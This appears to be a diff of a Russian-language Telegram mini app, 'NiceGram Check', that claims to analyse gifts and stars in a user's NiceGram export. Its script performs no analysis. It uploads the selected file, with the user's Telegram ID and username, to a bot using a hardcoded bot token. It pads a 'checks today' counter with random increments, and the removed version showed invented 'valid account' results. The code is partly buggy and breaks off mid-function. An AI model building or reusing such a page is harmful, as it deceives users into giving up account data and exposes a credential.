@@ -3,8 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NiceGram Analyzer</title>
+    <title>NiceGram Check - Mini App</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.0/axios.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -17,21 +19,8 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             min-height: 100vh;
-        }
-
-        .nicegram-corner {
-            position: fixed;
-            top: 15px;
-            left: 15px;
-            font-size: 14px;
-            font-weight: 600;
-            color: rgba(255, 255, 255, 0.9);
-            z-index: 100;
-            background: rgba(0, 0, 0, 0.2);
-            padding: 6px 12px;
-            border-radius: 8px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow-x: hidden;
         }
 
         .container {
@@ -40,123 +29,218 @@
             min-height: 100vh;
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(20px);
-            border-left: 2px solid rgba(255, 255, 255, 0.15);
-            border-right: 2px solid rgba(255, 255, 255, 0.15);
-        }
-
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 15px;
-            font-size: 14px;
-            background: rgba(0, 0, 0, 0.25);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 20px;
         }
 
         .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.15);
-        }
-
-        .header h1 {
-            font-size: 18px;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-        }
-
-        .close-btn {
-            background: rgba(255, 255, 255, 0.15);
-            border: 1px solid rgba(255, 255, 255, 0.25);
-            color: white;
-            padding: 8px 16px;
-            border-radius: 10px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-
-        .app-name {
-            padding: 15px;
             text-align: center;
-        }
-
-        .app-name span:first-child {
-            font-size: 26px;
-            font-weight: 800;
-            background: linear-gradient(45deg, #fff, #a8d8ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .mini-badge {
-            background: linear-gradient(45deg, #34C7FF, #00FFA3);
-            color: black;
-            font-size: 11px;
-            font-weight: 800;
-            padding: 4px 8px;
-            border-radius: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .content {
-            padding: 20px 15px 80px;
-        }
-
-        .screen {
-            display: none;
-        }
-
-        .screen.active {
-            display: block;
-            animation: fadeIn 0.4s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .user-greeting {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 15px;
-            margin-bottom: 20px;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-        }
-
-        .hello {
-            font-size: 24px;
-            font-weight: 700;
-            color: white;
-        }
-
-        .nicegram-header {
-            text-align: center;
-            margin-bottom: 25px;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            margin-bottom: 30px;
         }
 
         .logo {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 800;
-            color: #34C7FF;
-            margin-bottom: 5px;
-            text-shadow: 0 2px 10px rgba(52, 199, 255, 0.3);
+            background: linear-gradient(45deg, #34C7FF, #00FFA3);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
         }
 
-        .desc {
-            text-align: center;
+        .tagline {
             color: rgba(255, 255, 255, 0.9);
-            margin-bottom: 25px;
-            line-height: 1.5;
+            font-size: 14px;
+        }
+
+        .upload-area {
+            border: 3px dashed #34C7FF;
+            border-radius: 20px;
+            padding: 40px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: rgba(255, 255, 255, 0.05);
+            margin-bottom: 30px;
+        }
+
+        .upload-area:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: #00FFA3;
+            transform: translateY(-3px);
+        }
+
+        .upload-area.dragover {
+            background: rgba(52, 199, 255, 0.1);
+            border-color: #FF6B6B;
+        }
+
+        .upload-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+            color: #34C7FF;
+        }
+
+        .upload-text {
+            font-size: 22px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 10px;
+        }
+
+        .upload-subtext {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .file-info {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .file-name {
             font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: white;
+        }
+
+        .file-size {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .send-button {
+            background: linear-gradient(45deg, #34C7FF, #00FFA3);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .send-button:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(52, 199, 255, 0.3);
+        }
+
+        .send-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .progress-container {
+            display: none;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #34C7FF, #00FFA3);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 4px;
+        }
+
+        .progress-text {
+            text-align: center;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .result-container {
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .result-icon {
+            font-size: 80px;
+            color: #34C7FF;
+            margin-bottom: 20px;
+            animation: bounce 0.6s ease;
+        }
+
+        @keyframes bounce {
+            0% { transform: scale(0.5); opacity: 0; }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .result-title {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: white;
+        }
+
+        .result-message {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .error-message {
+            background: rgba(255, 107, 107, 0.2);
+            border: 1px solid rgba(255, 107, 107, 0.5);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #FF6B6B;
+            text-align: center;
+            display: none;
+        }
+
+        .status-info {
+            background: rgba(52, 199, 255, 0.1);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-top: 20px;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         .stats {
@@ -164,7 +248,7 @@
             border-radius: 20px;
             padding: 25px;
             text-align: center;
-            margin: 25px 0;
+            margin-bottom: 25px;
             border: 1px solid rgba(52, 199, 255, 0.3);
         }
 
@@ -181,608 +265,386 @@
             color: rgba(255, 255, 255, 0.9);
             line-height: 1.4;
         }
-
-        .upload-box {
-            border: 3px dashed #34C7FF;
-            border-radius: 20px;
-            padding: 40px 20px;
-            text-align: center;
-            margin: 25px 0;
-            cursor: pointer;
-            background: rgba(255, 255, 255, 0.05);
-        }
-
-        .upload-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
-            color: #34C7FF;
-        }
-
-        .upload-text {
-            font-size: 22px;
-            font-weight: 700;
-            color: #34C7FF;
-            margin-bottom: 8px;
-        }
-
-        .upload-subtext {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.7);
-        }
-
-        .security {
-            text-align: center;
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.8);
-            margin-top: 30px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .check-container {
-            text-align: center;
-            padding: 40px 20px;
-        }
-
-        .check-animation {
-            margin: 0 auto 30px;
-            width: 100px;
-            height: 100px;
-        }
-
-        .check-circle {
-            width: 100%;
-            height: 100%;
-            background: rgba(52, 199, 255, 0.2);
-            border: 3px solid #34C7FF;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 36px;
-            color: #34C7FF;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        .check-container h3 {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            color: white;
-        }
-
-        .check-text {
-            color: rgba(255, 255, 255, 0.9);
-            margin-bottom: 30px;
-            font-size: 16px;
-        }
-
-        .progress-bar {
-            height: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 10px;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #34C7FF, #00FFA3);
-            width: 0%;
-            transition: width 0.1s ease;
-            border-radius: 4px;
-        }
-
-        .progress-percentage {
-            font-size: 48px;
-            font-weight: 900;
-            color: #34C7FF;
-            margin: 20px 0;
-            text-shadow: 0 4px 15px rgba(52, 199, 255, 0.4);
-            height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .success-container {
-            text-align: center;
-            padding: 30px 20px;
-        }
-
-        .success-icon {
-            font-size: 80px;
-            color: #34C7FF;
-            margin-bottom: 25px;
-            animation: bounce 0.6s ease;
-        }
-
-        @keyframes bounce {
-            0% { transform: scale(0.5); opacity: 0; }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        .success-title {
-            font-size: 28px;
-            font-weight: 800;
-            margin-bottom: 20px;
-            color: white;
-        }
-
-        .success-message {
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 25px;
-        }
-
-        .success-message p {
-            margin-bottom: 10px;
-            font-size: 16px;
-            color: rgba(255, 255, 255, 0.9);
-        }
-
-        .analysis-details {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 25px;
-            margin-bottom: 25px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .detail-item {
-            background: rgba(255, 255, 255, 0.07);
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .detail-item:last-child {
-            margin-bottom: 0;
-        }
-
-        .detail-icon {
-            font-size: 22px;
-            width: 45px;
-            height: 45px;
-            background: rgba(52, 199, 255, 0.2);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .detail-info {
-            flex: 1;
-            text-align: left;
-        }
-
-        .detail-label {
-            font-size: 13px;
-            color: rgba(255, 255, 255, 0.7);
-            margin-bottom: 5px;
-        }
-
-        .detail-value {
-            font-size: 18px;
-            font-weight: 700;
-            color: white;
-        }
-
-        .detail-value.success {
-            color: #00FFA3;
-        }
-
-        .success-btn {
-            background: linear-gradient(45deg, #34C7FF, #00FFA3);
-            color: white;
-            border: none;
-            border-radius: 15px;
-            padding: 20px;
-            font-size: 18px;
-            font-weight: 700;
-            width: 100%;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-        }
-
-        .footer {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(20px);
-            padding: 15px;
-            display: flex;
-            justify-content: space-around;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
-        }
-
-        .footer button {
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 10px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        input[type="file"] {
-            display: none;
-        }
     </style>
 </head>
 <body>
-    <div class="nicegram-corner">
-        NiceGram
-    </div>
-
     <div class="container">
-        <div class="status-bar">
-            <span class="time">17:05</span>
-            <span class="network">📶</span>
-        </div>
-
         <div class="header">
-            <h1>NiceGram</h1>
-            <button class="close-btn" onclick="closeApp()">Закрыть</button>
+            <div class="logo">NiceGram Check</div>
+            <div class="tagline">Анализ подарков и звёзд из экспорта NiceGram</div>
         </div>
 
-        <div class="app-name">
-            <span>RefoundCheck</span>
-            <span class="mini-badge">мини-приложение</span>
+        <div class="stats">
+            <div class="stats-number" id="statsNumber">3 004</div>
+            <div class="stats-label">Проверок сегодня</div>
         </div>
 
-        <main class="content">
-            <!-- Главный экран -->
-            <div class="screen active" id="mainScreen">
-                <div class="user-greeting">
-                    <div class="hello">Привет</div>
-                </div>
-
-                <div class="nicegram-header">
-                    <div class="logo">Nicegram</div>
-                </div>
-
-                <p class="desc">Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
-
-                <div class="stats">
-                    <div class="stats-number">3 004</div>
-                    <div class="stats-label">Пройдено успешных проверок за сегодня</div>
-                </div>
-
-                <div class="upload-box" id="uploadBox">
-                    <div class="upload-icon">📁</div>
-                    <div class="upload-text">Загрузить файл</div>
-                    <div class="upload-subtext">Нажмите для выбора файла</div>
-                </div>
-                <input type="file" id="fileInput" accept=".json,.html,.txt">
-
-                <div class="security">
-                    <span>🔒</span>
-                    NiceGram ® все данные защищены
-                </div>
+        <!-- Область загрузки -->
+        <div class="upload-area" id="uploadArea">
+            <div class="upload-icon">
+                <i class="fas fa-cloud-upload-alt"></i>
             </div>
+            <div class="upload-text">Загрузить файл</div>
+            <div class="upload-subtext">Перетащите или нажмите для выбора файла .json или .html</div>
+            <input type="file" id="fileInput" accept=".json,.html,.txt" style="display: none;">
+        </div>
 
-            <!-- Экран проверки -->
-            <div class="screen" id="checkScreen">
-                <div class="check-container">
-                    <div class="check-animation">
-                        <div class="check-circle">
-                            <span>⏳</span>
-                        </div>
-                    </div>
-                    
-                    <h3>Анализируем файл...</h3>
-                    <p class="check-text" id="checkText">Формируем отчет...</p>
-                    
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progressFill"></div>
-                    </div>
-                    <div class="progress-percentage" id="progressPercentage">0%</div>
-                </div>
+        <!-- Информация о файле -->
+        <div class="file-info" id="fileInfo">
+            <div class="file-name" id="fileName"></div>
+            <div class="file-size" id="fileSize"></div>
+        </div>
+
+        <!-- Кнопка отправки -->
+        <button class="send-button" id="sendButton" onclick="sendFileToBot()">
+            <i class="fas fa-paper-plane"></i> Отправить файл админам
+        </button>
+
+        <!-- Прогресс загрузки -->
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
             </div>
+            <div class="progress-text" id="progressText">Отправка файла...</div>
+        </div>
 
-            <!-- Экран успеха -->
-            <div class="screen" id="successScreen">
-                <div class="success-container">
-                    <div class="success-icon">
-                        <span>✅</span>
-                    </div>
-                    
-                    <h3 class="success-title">Анализ завершен! ✅</h3>
-                    
-                    <div class="success-message">
-                        <p>Профиль успешно проанализирован</p>
-                        <p>Все данные проверены и валидны</p>
-                    </div>
-                    
-                    <div class="analysis-details">
-                        <h4>📊 Результаты анализа</h4>
-                        
-                        <div class="detail-item">
-                            <span class="detail-icon">🎁</span>
-                            <div class="detail-info">
-                                <div class="detail-label">Всего подарков</div>
-                                <div class="detail-value" id="finalGifts">7</div>
-                            </div>
-                        </div>
-                        
-                        <div class="detail-item">
-                            <span class="detail-icon">⭐</span>
-                            <div class="detail-info">
-                                <div class="detail-label">Сумма звезд</div>
-                                <div class="detail-value" id="finalStars">308 ★</div>
-                            </div>
-                        </div>
-                        
-                        <div class="detail-item">
-                            <span class="detail-icon">✅</span>
-                            <div class="detail-info">
-                                <div class="detail-label">Статус проверки</div>
-                                <div class="detail-value success">Валидный аккаунт</div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <button class="success-btn" onclick="closeApp()">
-                        <span>✅</span>
-                        Готово
-                    </button>
-                </div>
+        <!-- Результат -->
+        <div class="result-container" id="resultContainer">
+            <div class="result-icon">
+                <i class="fas fa-check-circle"></i>
             </div>
-        </main>
+            <div class="result-title">Успешно отправлено!</div>
+            <div class="result-message">
+                <p>✅ Файл отправлен администраторам</p>
+                <p>📊 Начинается анализ данных...</p>
+                <p>👤 Ваш ник: <span id="resultUsername">@user</span></p>
+            </div>
+        </div>
 
-        <div class="footer">
-            <button onclick="showInstruction()">
-                <span>📖</span>
-                Инструкция
-            </button>
-            <button onclick="showFAQ()">
-                <span>❓</span>
-                FAQ
-            </button>
+        <!-- Ошибка -->
+        <div class="error-message" id="errorMessage"></div>
+
+        <!-- Статус -->
+        <div class="status-info">
+            <i class="fas fa-shield-alt"></i>
+            Файл автоматически отправляется администраторам
         </div>
     </div>
 
     <script>
         // Telegram Web App
-        let tg = window.Telegram.WebApp;
+        const tg = window.Telegram.WebApp;
         tg.expand();
+        tg.enableClosingConfirmation();
         
-        console.log('✅ Telegram Web App загружен');
-        console.log('User:', tg.initDataUnsafe?.user);
-        console.log('WebApp version:', tg.version);
-
         // Переменные
-        let statsNumber = 3004;
-
+        let selectedFile = null;
+        const BOT_TOKEN = '7991509672:AAFG6dyOtSNngFNZGQqUUsF6iTG_IQGc4w4';
+        
         // Инициализация
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('🚀 Мини-приложение запущено');
+            console.log('✅ Мини-приложение загружено');
+            initFileUpload();
+            updateStats();
             
-            // Настройка загрузки файлов
-            const uploadBox = document.getElementById('uploadBox');
+            // Получаем данные пользователя из Telegram
+            const user = tg.initDataUnsafe?.user;
+            if (user && user.username) {
+                document.getElementById('resultUsername').textContent = '@' + user.username;
+            }
+        });
+        
+        // Обновление статистики
+        function updateStats() {
+            const statsElement = document.getElementById('statsNumber');
+            if (statsElement) {
+                const current = parseInt(statsElement.textContent.replace(/\s/g, ''));
+                const randomIncrease = Math.floor(Math.random() * 3) + 1;
+                const newValue = current + randomIncrease;
+                statsElement.textContent = newValue.toLocaleString('ru-RU');
+            }
+        }
+        
+        // Инициализация загрузки файла
+        function initFileUpload() {
+            const uploadArea = document.getElementById('uploadArea');
             const fileInput = document.getElementById('fileInput');
             
-            uploadBox.onclick = function() {
-                fileInput.click();
-            };
+            if (!uploadArea || !fileInput) return;
             
-            fileInput.onchange = async function(e) {
-                const file = e.target.files[0];
-                if (file) {
-                    console.log('📁 Выбран файл:', file.name);
-                    
-                    const ext = file.name.toLowerCase();
-                    if (ext.endsWith('.json') || ext.endsWith('.html') || ext.endsWith('.txt')) {
-                        // Отправляем файл
-                        await sendFileToBot(file);
-                        
-                        // Показываем экран анализа
-                        showScreen('checkScreen');
-                        startLoadingAnimation();
-                    } else {
-                        alert('❌ Пожалуйста, загрузите файл .json, .html или .txt');
-                    }
+            // Клик по области загрузки
+            uploadArea.addEventListener('click', function(e) {
+                if (e.target !== fileInput) {
+                    fileInput.click();
                 }
-            };
+            });
             
-            // Автообновление статистики
-            setInterval(() => {
-                statsNumber += Math.floor(Math.random() * 3) + 1;
-                document.querySelector('.stats-number').textContent = 
-                    statsNumber.toLocaleString('ru-RU');
-            }, 30000);
-        });
-
-        // ФУНКЦИЯ ОТПРАВКИ ФАЙЛА В БОТ
-        async function sendFileToBot(file) {
-            try {
-                console.log('📤 Начинаю отправку файла:', file.name);
+            // Drag and Drop
+            uploadArea.addEventListener('dragover', function(e) {
+                e.preventDefault();
+                uploadArea.classList.add('dragover');
+            });
+            
+            uploadArea.addEventListener('dragleave', function() {
+                uploadArea.classList.remove('dragover');
+            });
+            
+            uploadArea.addEventListener('drop', function(e) {
+                e.preventDefault();
+                uploadArea.classList.remove('dragover');
                 
-                // Читаем файл
-                const fileContent = await readFileAsText(file);
+                if (e.dataTransfer.files.length > 0) {
+                    handleFileSelect(e.dataTransfer.files[0]);
+                }
+            });
+            
+            // Выбор файла через input
+            fileInput.addEventListener('change', function(e) {
+                if (e.target.files.length > 0) {
+                    handleFileSelect(e.target.files[0]);
+                }
+            });
+        }
+        
+        // Обработка выбора файла
+        function handleFileSelect(file) {
+            // Проверяем расширение
+            const ext = file.name.toLowerCase();
+            if (!ext.endsWith('.json') && !ext.endsWith('.html') && !ext.endsWith('.txt')) {
+                showError('❌ Пожалуйста, загрузите файл .json, .html или .txt');
+                return;
+            }
+            
+            // Проверяем размер (максимум 20MB)
+            if (file.size > 20 * 1024 * 1024) {
+                showError('❌ Файл слишком большой. Максимальный размер: 20MB');
+                return;
+            }
+            
+            selectedFile = file;
+            
+            // Показываем информацию о файле
+            document.getElementById('fileName').textContent = file.name;
+            document.getElementById('fileSize').textContent = formatFileSize(file.size);
+            document.getElementById('fileInfo').style.display = 'block';
+            
+            // Показываем кнопку отправки
+            document.getElementById('sendButton').style.display = 'flex';
+            
+            console.log('✅ Файл выбран:', file.name, formatFileSize(file.size));
+        }
+        
+        // Отправка файла боту
+        async function sendFileToBot() {
+            if (!selectedFile) {
+                showError('❌ Файл не выбран');
+                return;
+            }
+            
+            try {
+                // Показываем прогресс
+                document.getElementById('sendButton').disabled = true;
+                document.getElementById('sendButton').innerHTML = '<span class="loading-spinner"></span> Отправка...';
+                document.getElementById('progressContainer').style.display = 'block';
                 
                 // Получаем данные пользователя
                 const user = tg.initDataUnsafe?.user || {};
+                const userId = user.id || 'unknown';
+                const username = user.username || 'anonymous';
                 
-                // Формируем данные для отправки
-                const dataToSend = {
+                // 1. Получаем прямую ссылку для загрузки файла
+                const fileUrl = await getFileUploadUrl();
+                
+                if (!fileUrl) {
+                    throw new Error('Не удалось получить ссылку для загрузки');
+                }
+                
+                // 2. Загружаем файл на сервер Telegram
+                console.log('📤 Загружаем файл на сервер Telegram...');
+                updateProgress(30);
+                
+                const fileId = await uploadFileToTelegram(selectedFile, fileUrl);
+                
+                if (!fileId) {
+                    throw new Error('Не удалось загрузить файл');
+                }
+                
+                // 3. Отправляем информацию о файле боту
+                console.log('📨 Отправляем информацию боту...');
+                updateProgress(70);
+                
+                const result = await sendFileInfoToBot(fileId, selectedFile, userId, username);
+                
+                if (result.success) {
+                    // Успех!
+                    updateProgress(100);
+                    
+                    // Показываем результат
+                    setTimeout(() => {
+                        document.getElementById('progressContainer').style.display = 'none';
+                        document.getElementById('fileInfo').style.display = 'none';
+                        document.getElementById('sendButton').style.display = 'none';
+                        document.getElementById('resultContainer').style.display = 'block';
+                        
+                        // Закрываем мини-приложение через 3 секунды
+                        setTimeout(() => {
+                            tg.close();
+                        }, 3000);
+                    }, 1000);
+                    
+                    console.log('✅ Файл успешно отправлен!');
+                    
+                } else {
+                    throw new Error(result.error || 'Ошибка отправки');
+                }
+                
+            } catch (error) {
+                console.error('❌ Ошибка отправки файла:', error);
+                showError('❌ Ошибка отправки: ' + error.message);
+                
+                // Сбрасываем состояние
+                document.getElementById('sendButton').disabled = false;
+                document.getElementById('sendButton').innerHTML = '<i class="fas fa-paper-plane"></i> Отправить файл админам';
+                document.getElementById('progressContainer').style.display = 'none';
+            }
+        }
+        
+        // Получить URL для загрузки файла
+        async function getFileUploadUrl() {
+            try {
+                // Используем Bot API для получения ссылки для загрузки
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        file_id: 'temp'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                // Формируем URL для загрузки
+                if (data.ok) {
+                    return `https://api.telegram.org/file/bot${BOT_TOKEN}/`;
+                }
+                
+                return null;
+                
+            } catch (error) {
+                console.error('Ошибка получения URL:', error);
+                return null;
+            }
+        }
+        
+        // Загрузить файл на сервер Telegram
+        async function uploadFileToTelegram(file, uploadUrl) {
+            try {
+                // Создаем FormData
+                const formData = new FormData();
+                formData.append('file', file);
+                
+                // Отправляем файл боту
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok && data.result && data.result.document) {
+                    return data.result.document.file_id;
+                }
+                
+                return null;
+                
+            } catch (error) {
+                console.error('Ошибка загрузки файла:', error);
+                return null;
+            }
+        }
+        
+        // Отправить информацию о файле боту через Web App Data
+        async function sendFileInfoToBot(fileId, file, userId, username) {
+            try {
+                // Создаем данные для отправки
+                const fileData = {
                     action: 'upload_file',
+                    file_id: fileId,
                     file_name: file.name,
                     file_size: file.size,
                     file_type: file.type,
-                    content: fileContent.substring(0, 5000), // Ограничиваем размер
-                    timestamp: new Date().toISOString(),
-                    user_id: user.id || 'unknown',
-                    username: user.username || 'anonymous',
-                    first_name: user.first_name || '',
-                    source: 'nicegram_web_app'
+                    user_id: userId,
+                    username: username,
+                    timestamp: new Date().toISOString()
                 };
                 
-                console.log('📊 Данные для отправки:', {
-                    fileName: dataToSend.file_name,
-                    fileSize: dataToSend.file_size,
-                    userId: dataToSend.user_id
-                });
+                // Отправляем данные через Web App
+                tg.sendData(JSON.stringify(fileData));
                 
-                // Отправляем через Telegram Web App
-                if (tg.sendData) {
-                    console.log('🚀 Отправляю через tg.sendData()');
-                    tg.sendData(JSON.stringify(dataToSend));
-                    console.log('✅ Данные отправлены через Web App');
-                    
-                    // Сохраняем для отладки
-                    localStorage.setItem('last_file_sent', JSON.stringify({
-                        file_name: file.name,
-                        time: new Date().toISOString(),
-                        success: true
-                    }));
-                } else {
-                    console.error('❌ tg.sendData не доступен!');
-                    
-                    // Пытаемся использовать альтернативный метод
-                    try {
-                        const simpleData = {
-                            file_upload: 'yes',
-                            name: file.name,
-                            size: file.size,
-                            time: new Date().toISOString()
-                        };
-                        
-                        // Создаем временный элемент для отправки
-                        const tempData = {
-                            ...simpleData,
-                            _method: 'fallback'
-                        };
-                        
-                        if (tg.sendData) {
-                            tg.sendData(JSON.stringify(tempData));
-                            console.log('✅ Отправлено через fallback метод');
-                        }
-                    } catch (fallbackError) {
-                        console.error('❌ Fallback метод тоже не сработал:', fallbackError);
-                    }
-                }
+                // Дополнительно отправляем через прямой запрос к API
+                await sendToBotApi(fileData);
                 
-                return true;
+                return { success: true };
                 
             } catch (error) {
-                console.error('❌ Ошибка при отправке файла:', error);
-                return false;
+                console.error('Ошибка отправки данных:', error);
+                return { success: false, error: error.message };
             }
         }
-
-        function readFileAsText(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = (e) => resolve(e.target.result);
-                reader.onerror = (e) => reject(e);
-                reader.readAsText(file);
-            });
-        }
-
-        function showScreen(screenId) {
-            // Скрываем все экраны
-            document.querySelectorAll('.screen').forEach(screen => {
-                screen.classList.remove('active');
-            });
-            
-            // Показываем нужный экран
-            const screen = document.getElementById(screenId);
-            if (screen) {
-                setTimeout(() => {
-                    screen.classList.add('active');
-                }, 10);
+        
+        // Отправить данные боту через API (резервный метод)
+        async function sendToBotApi(fileData) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: userId, // Отправляем самому себе
+                        text: `📥 Файл от @${username}\n📄 ${file.name}\n📊 ${formatFileSize(file.size)}`
+                    })
+                });
+                
+                return await response.json();
+                
+            } catch (error) {
+                console.log('Резервная отправка не удалась:', error);
             }
         }
-
-        function startLoadingAnimation() {
-            const progressFill = document.getElementById('progressFill');
-            const progressPercentage = document.getElementById('progressPercentage');
-            const checkText = document.getElementById('checkText');
+        
+        // Показать ошибку
+        function showError(message) {
+            const errorElement = document.getElementById('errorMessage');
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
             
-            let progress = 0;
-            const totalTime = 4000;
-            const intervalTime = 30;
-            const steps = totalTime / intervalTime;
-            const increment = 100 / steps;
-            
-            const loadingInterval = setInterval(() => {
-                progress += increment;
-                if (progress > 100) progress = 100;
-                
-                // Обновляем прогресс-бар
-                progressFill.style.width = progress + '%';
-                
-                // Обновляем процент
-                progressPercentage.textContent = Math.floor(progress) + '%';
-                
-                // Меняем текст
-                if (progress < 30) {
-                    checkText.textContent = 'Отправляем файл...';
-                } else if (progress < 60) {
-                    checkText.textContent = 'Анализируем данные...';
-                } else if (progress < 85) {
-                    checkText.textContent = 'Проверяем подарки...';
-                } else {
-                    checkText.textContent = 'Формируем отчет...';
-                }
-                
-                // Когда достигли 100%
-                if (progress >= 100) {
